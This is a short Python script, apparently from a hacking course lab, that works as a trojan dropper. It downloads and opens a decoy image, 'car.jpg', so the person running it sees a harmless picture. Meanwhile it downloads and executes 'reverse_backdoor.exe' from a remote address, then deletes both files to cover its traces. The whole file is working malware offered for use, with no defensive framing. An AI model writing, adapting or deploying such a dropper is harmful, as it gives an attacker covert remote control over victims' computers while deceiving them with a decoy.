#!/usr/bin/env python
import requests, subprocess, re, os, tempfile


def download(url):
    get_response = requests.get(url)
    # print(get_response.content)
    # w - write b - binary
    file_name = url.split("/")[-1]
    # print(file_name)
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

#shows image to person who executes the program
download("https://10.0.2.15/car.jpg")
subprocess.Popen("car.jpg", shell=True)

#will run this process in the background until we stop it.
download("https://10.0.2.15/reverse_backdoor.exe")
subprocess.call("reverse_backdoor.exe", shell=True)

os.remove("car.jpg")
os.remove("reverse_backdoor.exe")